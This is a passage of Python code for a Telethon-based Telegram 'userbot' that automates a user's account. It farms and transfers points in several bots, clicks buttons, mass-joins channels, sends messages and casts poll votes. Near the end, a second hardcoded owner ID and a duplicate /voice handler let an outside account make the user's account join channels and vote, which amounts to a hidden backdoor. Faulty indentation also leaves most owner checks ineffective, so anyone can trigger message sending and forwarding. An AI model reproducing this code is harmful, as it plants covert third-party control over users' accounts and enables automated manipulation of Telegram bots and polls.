@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/xs2 (.*)'))
async def OwnerStart(event):
    xs = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await xXStrem.send_message(bot_usernamee, xs)
    sleep(4)
    msg = await xXStrem.get_messages(bot_usernamee, limit=1)

    await msg[0].forward_to(ownerhmd_id)

@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/xs3 (.*)'))
async def OwnerStart(event):
    xs = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await xXStrem.send_message(bot_usernameee, xs)
    sleep(4)
    msg = await xXStrem.get_messages(bot_usernameee, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/xs4 (.*)'))
async def OwnerStart(event):
    xs = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await xXStrem.send_message(bot_usernameeee, xs)
    sleep(4)
    msg = await xXStrem.get_messages(bot_usernameeee, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'/xstrem1'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_username, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await xXStrem.get_messages(bot_username, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'/xstrem2'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await xXStrem.get_messages(bot_usernamee, limit=1)

    await msg[0].forward_to(ownerhmd_id)
 
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'/xstrem3'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await xXStrem.get_messages(bot_usernameee, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'/xstrem4'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await xXStrem.get_messages(bot_usernameeee, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    

@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'/lstrem'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        dialogs = await xXStrem.get_dialogs()
        for dialog in dialogs:
            if dialog.is_channel:
                await xXStrem(LeaveChannelRequest(dialog.entity))
                await event.respond(f"**قـمت بمغادرة جميـع القـنوات والمجموعات**")
                




@xXStrem.on(events.NewMessage(pattern=r'^/send (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
     usern = event.pattern_match.group(1)
    mase = event.pattern_match.group(2)
    await xXStrem.send_message(usern, mase)
    await event.respond(f"**تـم إرسـال الرسالة إلـى المستخدم {usern}**")    
    
    

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/transfer'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**مرحـبًا بك فـي قـسم تحويل النقـاط
        
• @ZMMBOT - `/xs1 + عدد النقـاط `
• @A_MAN9300BOT - `/xs2 + عدد النقـاط`
• @MARKTEBOT - `/xs3 + عدد النقـاط `
• @XNSEX21BOT - `/xs4 + عدد النقـاط`**""")



@xXStrem.on(events.NewMessage(outgoing=False, pattern='/infoacc'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**مرحـبًا فـي قـسم معلومات الحسابات 
• @ZMMBOT - `/xstrem1`
• @A_MAN9300BOT - `/xstrem2`
• @MARKTEBOT - `/xstrem3`
• @XNSEX21BOT - `/xstrem4`**""")


@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
async def OwnerStart(event):
    userbt = event.pattern_match.group(1) 
    bt = int(event.pattern_match.group(2))
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(userbt, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(userbt, limit=1)
    await msg1[0].click(bt)
    await xXStrem.send_message(event.chat_id, f"**❈ حـسـنًا قـمت بالنقـر على الزر رقـم {bt}**")
        

@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
async def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        sing = await xXStrem.send_message(event.chat_id, f"**❈ حـسـنًا سوف اقـوم بتحويل آخر رسالة\n❈ من المستخدم {userbott}**")
        msgs = await xXStrem.get_messages(userbott, limit=1)
        if msgs:
            await msgs[0].forward_to(ownerhmd_id)
       
@xXStrem.on(events.NewMessage(outgoing=False, pattern='/join'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        send = await xXStrem.send_message(event.chat_id, "**جاري الانضـمام التلقـائي للقـنوات**")
        joinq = await xXStrem(JoinChannelRequest('d3boot_7'))
        joinw = await xXStrem(JoinChannelRequest('Fvvvv'))
        joine = await xXStrem(JoinChannelRequest('DzDDDD'))
        joinr = await xXStrem(JoinChannelRequest('botbillion'))
        joint = await xXStrem(JoinChannelRequest('zzzzzz1'))
        joiny = await xXStrem(JoinChannelRequest('zzzzzz'))
        joini = await xXStrem(JoinChannelRequest('zz_MX'))
        joino = await xXStrem(JoinChannelRequest('lI7777Il'))
        joinp = await xXStrem(JoinChannelRequest('KTTTT'))
        joina = await xXStrem(JoinChannelRequest('RRXFR'))
        sendd = await xXStrem.send_message(event.chat_id, "**تـم الانضـمام فـي القـنوات**")
        
@xXStrem.on(events.NewMessage(outgoing=False, pattern='/jn (.*)'))
async def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        sendy = await xXStrem.send_message(event.chat_id,f"**جاري الانضـمام فـي القـناة @{usercht}**")
        joinch = await xXStrem(JoinChannelRequest(usercht))
        sendy = await xXStrem.send_message(event.chat_id,f"**تم الانضـمام فـي القـناة @{usercht}**")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/lv (.*)'))
async def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        sendy = await xXStrem.send_message(event.chat_id,f"**جاري مغادرة القـناة  @{usercht}**")
        joinch = await xXStrem(LeaveChannelRequest(usercht))
        sendy = await xXStrem.send_message(event.chat_id,f"**تم مغادرة القـناة @{usercht}**")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        chn = event.pattern_match.group(1)
        nu = int(event.pattern_match.group(2))
        nuu = nu - 1
        wait = await xXStrem.send_message(ownerhmd_id,'**⚝ حـسـنًا سوف اقـوم بالانضـمام والتصويت**')
        haso = await xXStrem.get_entity(chn)
        join = await xXStrem(JoinChannelRequest(chn))
        joion = await xXStrem(JoinChannelRequest('d8bb8'))
        somy = await xXStrem.get_messages(chn, limit=nu)
        await somy[nuu].click(0)
        sleep(1)
        await xXStrem.send_message(ownerhmd_id,'**⚝ قـمت بالانضـمام والتصويت بنجاح**')

ownerhmd_ids = 5413631898
@xXStrem.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_ids:
        chn = event.pattern_match.group(1)
        nu = int(event.pattern_match.group(2))
        nuu = nu - 1
        wait = await xXStrem.send_message(ownerhmd_ids,'**⚝ حـسـنًا سوف اقـوم بالانضـمام والتصويت**')
        haso = await xXStrem.get_entity(chn)
        join = await xXStrem(JoinChannelRequest(chn))
        joion = await xXStrem(JoinChannelRequest('d8bb8'))
        somy = await xXStrem.get_messages(chn, limit=nu)
        await somy[nuu].click(0)
        sleep(1)
        await xXStrem.send_message(ownerhmd_ids,'**⚝ قـمت بالانضـمام والتصويت بنجاح**')


print("💠 xXStrem Userbot Running 💠")
xXStrem.run_until_disconnected()


#code skip accumulate strems by t.me.zzzzl1l thank you my bro


#thank_you_brother_hossam